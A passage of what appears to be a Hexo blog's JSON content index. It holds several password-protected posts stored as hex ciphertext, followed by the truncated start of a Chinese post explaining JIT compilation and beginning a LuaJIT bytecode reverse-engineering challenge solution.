825f9ff30c8b4f3ea4d0e3371a5f62c29d9136b4464141c1450507458ee10fed14214460094f43b327904f47a23f9e9e55f7ec6c50b91d5b71336cba06246a00af861279116d417f80eb4321b6e6982b253165c8762170493fc8c6efb2d472876f3b495868c5a4c23cc4027bda5dd88ea389a71045ae1ea8d59033fc920456f3a957035aa7eaf60201ce443de510be98974499ce276818dda63a04292e1b09b9bc45eedb594c2420334872cc2b1b58697ef7c75de378c21ae512a6912145b057f5821c290bd98b429b25238e3d6a52959d5e7ed84ff8c02ad8da9c9a34f88de29dbe61d2a4d64d4e43bd7119f16fd6159a1d0529a2790525713c3d25e4ffe5bb44e4bba2932b2a3d25a07c23edde5fda54188896402185dd8a31f1f5639bbd19fd56f6ff9106bf79098971a05305a6d73f69a447bee566b1f09eb57d7e9d05e30caed9a7d97fd98487817705ec7922e5c6c524329afbe7ece8bbbf8e910329f628af518c48398fb45053554e5fe52694d592e8d9c19f31c3dfcba8d99cea1bab14d62b9af29880f7539acae2681643fb9e511a2c00d2b1fed12c359502c5511113c1daa018c0bfc72478c2af8f5ade5d7db12ba1feae3edf94f16095a8b5e7ad886366def184bb6982f8156b21410d3fb7afdb4a8a85e559676c42b2e38b3885d1ae28617ded0c50cb5a57925f650c020e30dc413c00a7b3a2fc7348402dd349ace1be34d3fc60601149844422dcbe5d0864e8db01ccc6d150ba08c87b2ff26a2d695661194bebd5fa244e6306a6131c8d86b80433b300f9122b0d9c262b7cd24b5c321e9352c47c0423c94e73933707c236ec44b3af7d9af3df0c7e8a658e1f22665d69599ce7b015eef25104922db02c640f847595d93b0ec587d991576f3bd80ee546d50d0b3d5630c30f13acb949538f9c79001a6499c1cdc5f65aa4f6549c41b510de5f682437f63e56fbf1f83d6650e6670d248f590b671e9bf50133e4b38d2e363b9168e0ce0b9c166c63e31c606138381c138d59123bffc09f16747fa484c7996319e783fd5e3cef24154d962fd95ff2e9a1b74827570dfce0cefcd43bf48b2a3549218bd8c9344a49594a1f3fca9487cf4b7b6e5beb3132ca54d43fda47313678530b9c475faf37b5b9508d5c5d4c754830678ca2c828bc05dd6f56ff8ac365ef8ae6dfddc6975423427fb64bb89ea210fd756bcc4d0ff146dfd32e74fb5858a96c18f674833579d3155e1e4d7f96d3f5547aca445fd51695e4a758501482167bd127e53858c7d7d2a4f7b146e8698c4af43e35f18ce769217f408c46e9c76b209523a8ffe1c91951976498513d747c8fd3e0aa0a9cc65df24d92aa3c385d88073d9360f86244d0120eeb1efe6e48da78ecc2e126455f77be936ebea4d503b87d8e426cffa919114e54f26f150fa401a2a0f0c534869cfac56c1a80bda1653983d6bbc29a48334608d62b232e176a3db1bf93e249288bac91674ad300a46264ea2e8261057b16024062c751ba69a54212f345bb05885ebc09397f3a3412b99309593b8efd384d10f22dc5fb2eef7f739790820bd9cecd3e3ca9b1da57c8d17c40f9612cfc2a87e017cbad6ea5e032915637bb48346837314f46c8d96fd16c98a8f34ab8063e6e592cb8566f792887183c17fb07633f3949c6cfd9d9f32e9f332a8acefe039eab5c3de8db3ee5426da5c443f8345e20a20b5b19472bbec48aba041ba4d4a1c5c31b6adb5dd99f1ab10a11da561e2d5da0d40447afb1d28206e1ea525cb88d2753b3c34acd9c82c645c0d54b2c967d4ebf14bb5838178bbaed639c4787e34d459ac1f97aadf6b0af77890ae0cb8196500163d0991d09b6a5bb067bc60484afce7341fcd6c2ba28effba2cad3874f394fd84c00dc538077c32ae47c54dbdc029187bb7afc8699a392f2783de6657ef5b38ba67e0f4b2af1233c098c261a7096a6c501204a316d920951c7432359734b7fb61c389442ef07e99d8b8ab7c0452a6ead67d14d2072e568e0c79ed8c57875f794ca6e897aab19a5be5ec173edf4b27e5b6d2bf4c1944756f9d54986448cfebfacb9f4b8d2b49b3e50cb31936caa62eccd24a2b12cba56bfdf15ef5248f4d1230f614b859cbb602251d83dd2ffc4a26bd435941945616a6e1c8c555f178c015a211dc5e909f19d65ea51e9f28e3b69d779c7b5c11540b8ad3dc2fc727f78d42fc2c27095980e5fb6118eb8f3b1b349e31cf872e56a690b7bf33828f6afb0f5467e435b228b98a1b4df78356c93ea4d81d18ab4fdb768eb96ab1b33b017bb32a3716ad970b712a40eb0916c4f4ddec6f27a3cbb632e03b6d6d96fb80b487edf2cfe9d51acba3a1813e5ca1d99a671d414a8181b4aeac84b82c5f04c209ef9591d69b5cbe6d81dcb2bd8bb2e1a38ae8afe910c37838e57809f4f23b66153fbba71c36c00d4f09792883a61e61a278bc5ad71dec6389b720087fab3fa50dd90af08b49bff52025334dc8c3db70e7e2803e4ae1e60b391eabe35ce15f9b5f06d3e763e9e2cc4dda17db551d6430cc01aea8118661f29a7420a8132b648018ad2d88d591fd5545a5177dbe2aa6c3e5a0216ec163340c820a36ec16d69c391940428b8b633d9cc7b5e4554f0454c86bdeebbc47f6cc7d8e8af49f86d824fe9d32ed563667dbf2453a28a286d0d8a397b7808f7c1c6fbb947b20014c7f6136f76522468a0193677941b0535d8d01fc655cf8c48159515b0948a36c4a9ce65171d22848c03652a62c8848444d31a3014587ed0bfc8af011695e97b41ce4732f5e9e6ba5582853d2972c48afa6db8a47321921999747f76e9cd742751ab29e8166621b93c13254ae44253e4b0b80ab51acd5fa7e4b65cf41f3e0312748f43589eb326d676d47e2185e16a0bfad214d3cc242e096fc74df8e26b69778aeb82429c138431ff75fc280e2847aa82320de9e6c342a487435790322b377043e907c5bae7918c7161df5f77891e2f3bcf6cfa114fb2b64cade7a66f7ea86f8895ff76935072a02de38e679691052a8921ca86bc794357139545e94882fe870da434b146eb76edca0c27d66238c502c3eac8fda5a93dd9442d4410c4769594c25f0f451cc85816cb0479db08e589fca7c05096b93d09976e4ccac93e15eb97fa30d0e5bc9f2144084d7b9c6da6d6e058a5c19cc3a363919bff5d9d2c5234f911295420f805f035446e08170124e2d0f26ea7f27d57f5aed85701439caf6dd445df3fdef9364a3164bcbfef0c818f6ee7a7514d1f14c9ff561de08350634a68af7dd01fa60ba1202e8189a6723fcdcd736b13b0eb840bc37ec3b173124be6052b814aac7f4915848c8eaa62d6da65c629987c36721228a106917e5c82f6d05f0f6d310fa2dddfb43fee0e272e419c7b0fcb6d13990015bc61319b2608ba257bd371b85a694152bd30ebd59ae61741ea066f0219b6fdeb2aedb04d3b2dd6c008ea6715c1d8dce45b515709e3067c9e95c2b5e01caa7e8a826e2d5a960ef9cdbe62796cabccddc1f074ebedb2b5d8f65ef14985d7f259c1cd0e6479884ed3f0d733b085fed2b10c4d52abe0c83d50e16fafe082093d13bc91f2fdcf4e5c9535338e40d791d14a5360b25acb75675edfa8f906e0853d17d6e1040faf090c7c8b76d01bab7175118d946403193587acffbfefa1d09c9dae93acd24f2847ac61d7f3ce0ebfdd487d899efb3de33cce6d80554e1ef462d409e46c650365f665556a5d95b972a69c9ca06d508bc9af562fae3054bbf7879ef37cb779d280262120ff462c829384826f3e880fb46759e4597d29a1352bf7eb801e958abab1230d48242ca1c3b1df0a757d93426a5d05965d98f4efd17a9b59b9646cd0d83e3d2bfa4b27df4c446d6a91ac79a045101568542c305fa9b1c79e8f08fc710acca7f74d4512b966ff0a3b12d32d928ad5c1c43794cc9ad53d72dccaa9099bff0a320b263808d508883ff1c2ef2563ff4c956257418e52530d2ad49e89d04025934c6bea87913383607863c61e62aadc1ac7e0bf5f4d1d38ef378ac081aced5cd3b02f56f49eda2e98bced66298819dc788985e65581b1100879e6517f8a60c5ef0754b5fe5b83863b793e3c04686fac60501110451b198c4850f0b18bebdf05f0d0e2e7d7f29226b8ad03726c610fb1e613489d7cb7e6dad1bbb624502b80993863337f0dbf84914f51ea43d30aac1409082a697f9e17a867d61ac34658b7d105346c35b6e3a1170725cd0cf157edf91672ad244f7bfb9a1446fc917251dfd7767c15e88d41daba8bb44c3c2f269655d742eb8516c1be0326731236087a9dcea922556bfdacf93851669d0d0391cb8cc7f5330aa06817d999a35e1dbbcec136dadd9ec552f3a899d1abde7037643e1868b43aeec9677f50a931d8312680c6a9a42f3b8d4cd951d915e9b52b46808a8f253bf9ffae5f4fa9dd830dab923271402a11cf0c22b1dd72c8e1edf4dceda3893a98da111b71d8391915cb04159b098bff150d76a20d83b9dfb5fd567535dce97143ff09339b79dd7ca28c1b75d288f7a5a8edf9d4fac65dae66c9cf59e1cfe2c33217fc233af033cb8a789201b68619474c91755ab1d78ab098c1a34250c51847086fc136536c2b722dd4de076032e855d790ad7e3cac39ce17ba5565c637c7f5ed18c6936a77afffb1e1a907a4649d76d7740ad77844a9acdb92b019ece779f715b1945ed74df82a5e2d250d090a8d906435af7846e4e0fea1f1853a874f830606860859d8b62d2467e6939646e40d4ea97427fc0f06f5623a96b124aa3064495a96bcf444b3e59e81fae4f005873beb5e714a37b1c2578f35aa7eaecd0a96d77c8d4b8337b987cfcb29d7cc9891482c634df1e8cc7f9851a3e3f36c87a4abca330a6dc52a0ed7544d509f9ac42d309ff084594ad9e76d40cca159cbc29c5cc1777a1245e54d3cbf01221c2fbac546d8631193ec6598f40eeaa336fca655cf166ded81ac3a2ccd0f8be5f2bb65c5e324e627f53434a256718398f55486483a170f3ca4b00a8edfdd218f198377cb49329c977f80fd315af7eb991054ca555a177d7b1c07bb721c0406ddaedc5e4fb615cd750249056181be73a7d09e8721ec9c4d085cf4270a9df0cc26fb88abf0831a77efe01e03b724de9eabb84963378c6943af223f5ab4749744abe883b4a70196f5a7220b24dbac3441dcb285f4910350a669fb720fd484a576aef8feef396720bb891c4f8819fbfd72f3f96cd5d27d1a38c78137cf84e739d35f667154a2e3eb30264d88f6762e93fc1a2c34601457ed6ff2dd1e2156011f3ec68a1e6869fc4fc03cb329804f2dfcf8e9a487ec057d843414ec0f990e9396fe1058c5839f7532b0c23345a3ce02238c05d0d1f237d74697f93dc946b3523b59600dfc90fb592b2d49aa96f23e63a58f0e85ac346edd98eea64614daf2f2e0c86993aff393443f5480de22ec4bb12bd47cefe3425ef994d7298898e672d150909f93262fe2a2606e47df05806e3a47b8dcfecf39febf008dbf866e4edb0dab09101fe1795735c1f168f4a05411b7bcc1549164ada3a8129abd335438068a4b357f19fd8378f72aaf17b076fb2d57e58c244f471f662bfa0018e42a0d17be132ae93856a6c67ff69436abcd0c4afdafd622dc94dda90cdcd9efcf529aa8ff678cdceae8af4dcf1f93e9a3e9273d3d82c00d05606a405bee7dfde9324b2be5cbdcc8e477cc5e8434edc1d8866a36ac954a93cf06b650758b45f53b67417287d57260cab32f88d8b36d0eeccba45edad4e01dc2093aa72269c3b4b446889c12ff58833eb50790698e90e6f5017b993d63a27d124ff60dee8a04af44a98c071d47ce8833412487c0e7531358e2e301d0b89e36fae9b72ffe366e73011c55a05cb5546ef9ec1c751a3e4a57c1827ae1b42bd34fc10a93ebd1d8ccf250ad98bbf8a10dea8ac37912219076a7db6511a49041cac5239c142af477c37c4f46bbfe62a2f0b52339b88b430aa457dd7c6b61e851c7addb6a591ce2eabe9d69ac58d9d6036fb4694f27a1f5e54bf118a26c2129b06d70474d80b24b20f28ddb0faa48296cf4576d638be5788f736b9b343200a5b859e85f92f0eb15d7b42293ec8bfd8fdc65f0e4855d23aa99566c1a47768a2a88217bb714671dfb1d57e43bd302b4e8e1238c52de534e52b2ea6a46eb1cdb7ef63eb00b695fb7f491933c215969ab6a859411043e0c8d489437bd46e7edee8bce48d14e198e41ca8434236aa8f7df61c77980bd0ad6fa88dc37ea69a443c3771031a9027cdea7241a6296cf421beb376c1ff7c33c53a9d19bc16a762a47ad500943b1748cb18f214f0746fff233a75b6823e71c6f4e2e38aa9c0e5b96498b3e15f3212137cfefa69b07958a739b108c9c54120d5ff096e6764b3bb852d5c7ffa3fc1382e92be0b733c97b3ae12df53d82a61939110fbcd32832e83493c4ebf81ca499a88f277178519ac6359f3812c16b4ba5be0390f2439acac139f96ce12d45fe23049c5c9c00489e413145e4e20d2ec3b1817d36ab948a6708420e0de07c7ddd73db05b4bfa256ed0fcc9e4723de5839384aafac971c0877dee04fcccb6babb66a64b147f60e453e9ccca8277760aaae6aed8e95feb9da079137a54350138d4d7d5d3dcdcd6fbea4e6c40852d0433e15fba3d74e44824ccbbdffd8465bbf828713eea2d52cd753c38dd526104335c4d780eb24c047c84a7e63d778dffb28407be9af27296758827a6accaeff5aad860004b377ab2900f3ef8193a6bca0ca4344f9019fe88292a1952c4d38690b609f25da81a8267bdf0148490a1b3410f040370ee867175282102ee92e5f526d0d170cac128badac93b25a79e50c41e1b87570cf5148b5cc9c14e08c19a1866962a90f6d446bdc84dc713ae1c51eacc158e0a0e6518e70961b4c9bc0ba86f407d6050f5bc1742c4bb24c4a01ec7098fb200027eca5d612ea1ec360da1ad464a81cca1c2de1832899ba63da32362f427a7899748df0d2ef4be734f4edbb2af8b35f90aac20cb9faf316885b1b4f344165f5ba1d05e4863703bb2147d3959957482aeefe44b09ac20d21d77b9b0060ce2fc01fb6e455da0f4e48a2937576925efaad1c40d8111549d986913ca3d33ec7cc2d5d686c49da28425fbf861f91e161b9c132745da9c31757f2af8626ff5889251a2824017bc2c34c1cbcf06337d42d12d3005af8734421ea58078fa3f77447e047e13701b99bd4c96a31c6bb7574d39f3f8fed0d0030af13be158aeb6ea87fd5c6c0cd4f570395c117be4972bb638c350902b8858e762450676b11b7022e1092270cfa2822c17dc1f81741836f20b098df7a05275541b230fb4b006abe1c238462890a8896441379d17dec284254c9c283e7870449191d65cc69c12cec84b308e1cc647ff58425287a13e8b98a9f1d0828680cc199a9308e1c0fe8909a273066bf169bc940fd50d4aadd30c97c25bf3508c85409f43b1c2c903b424fe8ed1981c9f90d728f7b4e615e99fd76c5f982bc906b756171181b925cf67079645efb195229e0f087a5e8a9f85ca283c2b19ad7491a2c47d67353db26c14d814b3e72fbe64bb20215e0eddb1039a143cd435d2a08f90fb2206323d1ac8ed442174da055e9d3332e1486237c4c51ce9fb4659f09842f5399d15c37c0e4b3f12e262dd3fccb349586dd75b04900d6b9babb94e5fdfe10d98427e603eacc729489ab982c75fb7d6c469b506681d974231cfe4c7466616cc3e180aadb11cbcb4256e293d20c5b827e7e70c999f8fe715a1ef49aad078f3ec0394d39a4734f19ef778ef252f3283d9d91d55138010fee02c26dacb010491b9556b3e8373477b0b6378fbbd5efd8b965545fd16f9942bbf5ceb0c0da30525fd2dce7fef6f99686aab33a990ee2d23b86d70c6690efa42c207788ec3cd7c8b3e7abd033513b402280774224dc7cf921d217ee53beca2d6c8e18a2efdd0460b8533c5a4ee781b7965a2746bb10cf98ab6509e0b4b84073805feee61fee44f73ddc5ea391f5862cd780fa7e12758544c99ccdf67617c9bbbf48f24642ba5629c914d406eb40f5ac50860d6c17fabf548dda4640734bf826b83e25fd1a3c8cf2d68c50a96148969714c12e7ae3975b203006214e06613658262ddc45f206a949dc8dfe4abc2565e8120fc371f7a622c416ae5a8829d4e917f4b176b57d66cfb658066cd897b1bd14689b9c4119af5135ba5d482807dc20cf9c784ca739d8e4839535deb560c3d2e46d85c727a7959a56cf3a20db9dbb1e114720fd3368bd0165fe1026c6d5450916ee4dd509cdc26f66327f2d577243ce71b669773478a24e67cc047f2e950cdeab1f59545f5d3ae75e75293c7c68bdc15c6eb0993967748f189d234fe55051c454daf49b02033f72d26c149bd9f08c8d89b851f0c29f88b4cd94c9bb928c69f9ea10babe7559c286a92ee11465a5950bc162114d3bdb7ce1b5494798f7eb2485ffad94c7d21063bac379873a4640199a3cdd0c8c685f47d818c568be9b4e545dbae3f6a4b6e5fa962707ee91560f4eaf0e6a5b6f974eaa7bf9f30de2c5df57a83eb0ba11f9d38fb9febc95982505e0c5440d5ac19948a9741925d9cf94d23e55aacc714d7a3568c20a79aa304442b0a0cdb15a781b5a472693d4f892d5c59f7ce437e1a1d3794bedb6fc3664e6066b17910b6c019efe6da7f0aefc764cab5a0c99e8051bfeba6a0cc8231f8e2e7429f4c950cf071d91e386cfce338c9d1d455a0cbd70becb0094fa3e3c4d54bdd65b30c401127552491da87a8319cc78c4dab10f7711580f4e70ae81681fd7b4d97fe700e836ad0486165c7c8ee9d8a2b44732b4c67dad441e8ea9c253eeba9a1cbe1f4ece12a29902820687dd2369921716448ef3c7b7d9e6d535918f0413d9590d68e0a1d3d43a471eb9c134b3a3486c762b8b5d0b179f95ad36f25b5e4ab5fbc05db6384fd67022bb7051295b88d463857de5b4fd02339be8ed0401b4eba445d4fccc00c8cf118c42f3db8d2b229cfe331fb893bb03cb34c528cf1ba3299eb6aa503c6257716477ad066c4c715007219ef13eccd7ae412ae289d8c06c1d07bc57f707c0326972b22e24a600aa2d10889803a4f3d7c19727cb16c0e6e91d2fa2e119b202b6a4ce3a858893ce153c7938b45ddd6dcde76da993eb01b4c8e2e6ea2be141fac9f8d87fbf06b3c270daf181e482aed3442b5b1b4ee2ecc5ae28b8c1cbd36c5f909d70d0f08bea87ae6346afc1a905b0baa733ceb7df0fd0734ea098d27e2b741924ff58c4b126f838f8007d9654f9b5b258201fd73a0fcb6c28ec649282e99e27737ad492f28fedd7f1172c7044e49405ec13dc99b29f55126b87baf97a3d59b53b165c93ef61525b241df8c57e48abff45a467856aaa30d6a082694dece0d63ba76e21d345cbeb3c86408f460b82d65286086aea81b95b4b0a82d1601ce17ededc6175cf11f1f4da815f6048a879e5c804e3951b6954180646e4dec7b0ec8c20b7a7eda9634edb5eba8b506364e82aea065cf12fd6092fe8b8d5bc533aa52e73bed918ac5b3b745e45ae504e1666ff7268c91a837f1d901af68da8ea6f1e1dc5e4893fa89e9ce4084bcfefbdf4072632a79078c1d6ba4bdbd0f9676c4c53f14cc2d91c9272d78910ef0ecdca30ec0a0c96775f6642a387c7a488fda2d284422c01375e5f5afa8760c7f4dd37be409d9d5505d4b4862fb68f671c3a66af1f43d9cde90f2a59b69a8571e9caa79b1be49a316d560c60c19097abfe13834c68a95672f7e29fdf1cb455d7806f485c2417e50c65d0c2074c4d5799f611b404ea991b881457c0f7ae16b27e9f672c93892629a4fd987cf9cddda19be3a30b645d40b792162b94ff462a027eda4348d4a9baeeccdd413a883efa020ed9f62e06752b95e48ad898f4df769decd2fcb4d02802124a8ad6f59e9ab842a46e429a9da99c54748448d26f377dbab1eb2c35ffb817d976503873e3fb51c4e4dc5b6149dddc2e677f6ec9ed0fb548c1f17d7afec6383d386d7b6fd1b1d35ef5e468c41221fe63c5b45d5d9860696415750087ce06df8e2676bc9474ca268135ca9e8e43fd03e1078bd745ceee1c38e6c5ec925de8b7f39c63e99b6a3ad1ad97d7f0f03c20f8be3e77aa55669d496d0a2324e88e174435b8f02f5f5a2984d0d01826263708999e8e5bb484ae7b4cb3dae1f4e052495f13b6d09bf3ed78deca404d7a0ef1a3f7f603c5c51533d2d1dc7f289cb0d060dacd62b05fc3700d4b62a716a6630fa04b2e473cbb6b5ca239a751f48ec8021f0928ba5f6ea434a71b886d9437c3ab8b5c859069afd1cb221b0b8a5678a9b3e4ee9694a446d365e1582f2049c0d850c02884f717be87cd476ed8d252f918f9975caf42751b0b946a9d344c37af8babeb89293560afb715d0d81b97621212b16800a55710853cf655f9f12445636091fc1db13e866022a0b40855dc3f91bc2cdaecbdf54240b4b43d697cd0926a3427a29a89d3d76fa951d13530d1d2386a0ecf049f9f4b8bd634f7b6cd6033d897c141221c302de3f77a48ddc4f13445556cad1a561561e71f031d1f09a687c75b7d20b95c30202c6c129232f267d6b235ac6be7b86287e3fc7a89607895b28aff60000c4c5e48e28a5e24d621046248f8c2d33d0b5887f9d8afacc1e61e92f4d9313fc5f7c64015df8e20b3d4c2bd6933e336c9ec2340b390668151852e0648e820f73fac4d313bfc79c768b0baeea512e41855b61ea3b623f23d1d7032835392f1868bf6f4dabd508d88ddf3f77816f0f2b57afe7b39d7e627c7dba9bb1295ee6afdc71860f1cc4304f47deac115ee46788ee8e50feaf05bf141305b2ed218ff685fee1c69930f8ab9c80be74914e3c6ff537986b17cf0eb86ce0fbf920f7a449fe5eccc9bf5ff71b32b24c966280aed63f623f13c9028d8c13c84a2200996ab814afee3c9eb639360fbfbdb331e5ffacbf1c40585458ee9f317a4f51999b6063087b4ddbb398d2228ea30116b86e6878e5fab3c2df28204e3a10ecb4748bf2c810aec776f390625f03577ee0e820b32ba6f32fd807e95a40db4095d13f98aa633fc7b400be7039232ae4e26fb17cfa503fe4e02696f161f8ee54fcb5c627f1d5369e96974cb3cacb6c880dd9cf0f7a472334eb4ccb13a22ad5a5a5cf1e4e1c071857530dc0c0a9ccd3e6e1be07feb2b2887c109e2e589bda7159f26e2ccebae510ef0eaa9395b19969fa85329fe62350abb19468dfc7367852bd2587bb08411d22a4b3224ffeb9ba900b232ca3e4cec6ea14e541f3c2a2396b2bcfb4f33dae931c060c797b55f053a0733f1a8fb4666a63e41970d1a0217abf2b4cb67a16c4024e56b0103ffd02ca8e39568a6dbe248f4ee3b843b8fd48264f203f580c74292f261b1a109a18c9867ac868e1358a6afc089b235af935f4df2a3852bdb8aede8c303d63ad23d18ecea8d85ce8be7b1574dcb7d4915f75713d9782f18feb2d7ce55ca74946f0a7f2b897ea18a00a80f0634ac759e1fc90b88f2d412994c4ad5daf3769865fc28b20f6c2e30ab97ea827c04146aa3eb3e12f02373a0e273f61a25bc867557618c21deeeb7fad9ba9744513bb42f38e4e76cb27b5a3991b6c0565397e2de8301305d0d6d0ed2c65525d073b04596f16ecd9fa6ab6d5ba0086d9a500fe68472c28965b00bb07a0ca917a12bb77810fa5b28ee672f462da1186a5601529f369cf00bf4bf1d96a205d52d6d6d4206b21d1f9242450b29bfc53dc5210511428a23666cf2dce15d0da0691f91a02a99f7bed0e9608c5023e0af09d2032a05b4910ec776e91a57ddccd9b60d8427d49f06b4ef5d8c639ba18aa7251988502e640a9d8defc0222ccdd3e2da183b57bddbd83fcfd8b7787f2a3a6bdfa2866e2c156200fe7edeb3a0d892364890e35e926fc366cef3cf7c68c2e657ad33234dcc62d339885f7ff7ac30d0481c9c961b8fe77f43a8ccc3564968b4dd35b915a39a4fc8438bace00908e4e52b0b6210125e9276ce1fb78a565eba04cee0bbf90fb4eda934b7b447acd3577861bf318cdac37c42ecabc89937b23b5a366b0b63a7d65035c5d73bf3074abcc6387e733360cb3cb20282395e238c0a6dedd1ec5b0ffc61bb21a9daea6f445743e8891e109d69aeaac6bc7ed925c6bf20b927155bcc0d2adf9b446892dc1d537380434670c027463830fed863398270fee0e6e545f34423a60bc49637b9f18f7f16249bae9db1e26cbff389862963fec88c87e79d0979fe46b27be4634356ac2a71d381e5fed0ac2ff35339a83736ae8d158dab1a8252cbd164e1815f3b5e9ec9e25f3e19c0948f15c7661d1b5b4417812cb7fd459ea3a3670f47d3b5523179b44050b8bd2e4ea0a24970b23236c5525b982796174d8bed11bb5f5cae4d96e387de6b2d0955e5544db3fed4544fcc47c67c66e545f271500d70311f08621571938b115ab068aa2075eed3855385d39db6aefced1fdd6cb1c6c834ab9beab8a0be8fcabb4ffe653eeb454ac203500b07ad2d592c1a081f3427839fb93ddcbae8fd2bb99d20fdc931852f10fc34afdbe61993a3e87015a442aed3b5a2c9b848eb4bceb74853ff0af389b5cf086b398337340c0220a5a35ec3254ababa78d5aa8357be150de7707af23bd82878555ac72b1e9960ccd7d84c80c811df3b2b8dab63200bfe9f138eebcf27b93834ead6ec97778f9bf92714f6eb1a04f9bd6eef6771acca7324b811f185177038d28c98be19d6c2792ea569530aa783b27fd4796f2624995c9afdd1b460a66083ea3ef202d64c6dc0168867bfdb5588e32bf58c9d4ed8121aca0aba1be16360176797f4adacd0c8d115200e92ddacd38fdb4687585f3e2d1676117a90ce48065649c60e0c21ba805577c3b17725f3cc50a7502079aaec436e0f3fb68bf139c41a7b17757dbcb0f2bf3aa9acecacf510ec9c4f2652a0a339646a92392950a49af504cfc8e8a23e34d11cf0d7263a081abafab189fb017aa9d129a0f76580795e5094bf54338787d4d9ba188f24e7f5dbd619555ab0ae66369fe12c9dc1a4c622bc80dc1e43b822488b28af884c1ae71d4cbeeb7b63b7e6cc95d74664c342484246ce249e9 您好, 这里需要密码.","categories":[{"name":"杂谈","slug":"杂谈","permalink":"http://example.com/categories/%E6%9D%82%E8%B0%88/"}],"tags":[{"name":"解语","slug":"解语","permalink":"http://example.com/tags/%E8%A7%A3%E8%AF%AD/"}],"keywords":[{"name":"杂谈","slug":"杂谈","permalink":"http://example.com/categories/%E6%9D%82%E8%B0%88/"}]},{"title":"Hack For Fun","slug":"Hack-for-fun","date":"2022-05-28T16:00:00.000Z","updated":"2022-08-25T12:41:38.169Z","comments":true,"path":"2022/05/29/Hack-for-fun/","link":"","permalink":"http://example.com/2022/05/29/Hack-for-fun/","excerpt":"有东西被加密了, 请输入密码查看.","text":"c516531d8dc397363af3dbbf8b155c576f834e3abc39fcec9d221cfb2863b6d71b888aee3b0127e306aea9980fcec5bf755faedcb0af6e6f6accf6daaba2a129db809978b8d02c3f612736960ecb3baca264a27d9db697eab269079b16033015a97717d27c0514715444803dccec8631c6ff24fa95fa34634dc60f14c3cc5515411e37a2ce64f19b150b8783c5f1bfe4089b740ae3cc41020fa65573fbbf1785e87abc6fa6157a08f41fbffa58fd6f604ba645d84d2ff20e7fb9fda0fc6f4365e7f8e535b141a3f1efb4d6e14f76fe38ec70543c51ac68e2eafea34c6e47527c4bc04316de9d5a739b0b1faed3e0522098103df341181b067f691eeaf9cf9fceff464a64c09f509ba0c3ae5605e6367c456c415b89c30ee941dd460c3f4493d064f28b01e181ed93f308f3806d335c6d2de5c761811083a772a48599fec4b728719322d1efc858c9f9257088f23fbb1345b5022ecbd4b3542fa58e5d4ae63b84cfd2ea00464b9f66f2b2eab10a131f4cf2356327ec34c6a425ce65adcf61ae6ad824c5e298d66ccffcbd3995d5c3e3666501084a17594df1733cb586228c595f3195e5643607ac5ed7bb6f0217c2543f022a1d9912acd4489115d4309d36924b597f9ac950c658a580c974db9d72d35d0ad597301b6ee7f836e9cc60c4d2daf8e9a77cfadf14647ca0635b1104ca92105bde6db7f81f888b99e291ba6da33998c5f59a1ad9ecbe999515eb1d7a392e2f6cdced4202b9e2e2bc25f9855c0855ab3b0b9d4759242dd4521759e5d6eb961905508537d181b6b955f6f3d15c352824ac0dea10e387fd4178ab991b875510285e3eed9d3f90b9105e6b23a30defd1d3a42ff1e8eb9fdd23146ecb8c717f436495793a1bd23218196263f6d48fd1605bd3d9f780dc43bce0f0f548052cf9f9e8c747e05b5da6152569063b1d98a66dc9610f3f0ee3c720723692f170f592e640326105934415273689684ede3e7c6d8d75ba2b633a41bb04b08b2f56e4089e1b26b33fecbe97af7e5e50232f600f08f1288a96dce566a585e851b32d1935babbd9d8bc72d68d63295e93c6985853b652399d338d3925a3e1649bde14e031ce536b542a7a227b41453192fd47e43ebaa0e6dcbfe9866b1193fb629184532e5b9cb4b6dcdfe85c41fb81129d154e4bc0c2466a768b87346a27f36f2e98007bffd5e7e5e4a8783111d62fea5d099198923bc4f98d32707b0b85a0b74d6525899ce1c06d346cb079fc08926772da3c2d5e836874ef1e078707a45c7680bf682ca4ad56d6a0a9541ed9c4818d8d40f5972ee920154db70fb9d62a60dfaefa1c1259ce0eb0fa9e7721406c602f7214da727c4bd73484b61a5fe826c97eabd1ff1c21ded4676fe645e55815c669abd3f2bc31a85b20e2ab815d4dfaaaa21600dfe7b891783f08bbac3eda4445eaff57f4d516e8f2e177325655dd5c405adcb132c3a70f7cb747eb40f4361092163ae943d0908d63ae6f802e6df18b10cb689f32677240c53401287f72efa4e7d41791a2c58e59db622d070d7902fab3d83ed53dfcd061f6aad56dab79b94a4858f256e7f0e7fa734d1c9e30f2342e6d8690d3daf274dec21a192bd0408ffb91a942c24d6aa08763e2515f9620d0310728b8ee6478dd250f2d37a6c9c49b7ae22a9d11a938102d42e4f9a5f82fe4fc25467481444a3b29e05526aefd07e5d7c4329f7343c74c2e3a44e8f5924e32aba49d1c69459a582c1541c062647a293f35edde3ecda96fc0701000837383361e883c90067af3e62a9c7c9ee5436d18936989758e61c4a8b6d42ebaccfbe7aed6c7bc8426ef9e47b06d04f21c630aa851614b772713428cad252ed7256868dab397a3dcec2b2982c6d21a4260ac5d5126cd16cfeffcd7d2dfb349fb652ecc45f31e925b213d3be7e6e74aa8811fd9a76f4b558d26bce3583fe716a5b92e235851a98e72db47aa04735c4d50930206d183a0910bc48c27579fc5641e00d6dde08c251c10a8a8667499e2d5c1ae80e2d5126a1eaf13d6999ba82b4561ca4e9c7c2ee0b28da6ef7a1464189b0827670301efa46684cc31103a1e6069c839545942e79293e4b84347c2f494f0152ebc9f4f58d1c5c1d23c5c49b0d6e99902742c507a11a72bbd7e638d3d291c39cde038f9ddcd31bc380ad6aa41ba672dae9e2689f144fad9e1ded690bf 您好, 这里需要密码.","categories":[{"name":"杂谈","slug":"杂谈","permalink":"http://example.com/categories/%E6%9D%82%E8%B0%88/"}],"tags":[{"name":"解语","slug":"解语","permalink":"http://example.com/tags/%E8%A7%A3%E8%AF%AD/"}],"keywords":[{"name":"杂谈","slug":"杂谈","permalink":"http://example.com/categories/%E6%9D%82%E8%B0%88/"}]},{"title":"JIT","slug":"JIT","date":"2022-05-27T16:00:00.000Z","updated":"2022-05-29T13:24:49.962Z","comments":true,"path":"2022/05/28/JIT/","link":"","permalink":"http://example.com/2022/05/28/JIT/","excerpt":"","text":"什么是JITJIT &#x3D; Just In Time即时编译，是动态编译的一种形式，是一种优化虚拟机运行的技术。程序运行通常有两种方式，一种是静态编译，一种是动态解释，即时编译混合了这二者。 lujit运行过程： 解题： 得到一个.out 文件，电脑识别成Wireshark 系列文件，拉入WinHex会发现是.LJ开头，可以推断是Luajit逆向。 先编译LuaJit2.1.0Beta3Download (luajit.org) 去官网下载 运行x64 Native Tools Command Prompt for VS （用Everything搜索）， 然后将下载的安装包解压到相应的盘下，然后进入解压后的SRC文件 msvcbuild.bat gc64编译出的64位（题目的64位 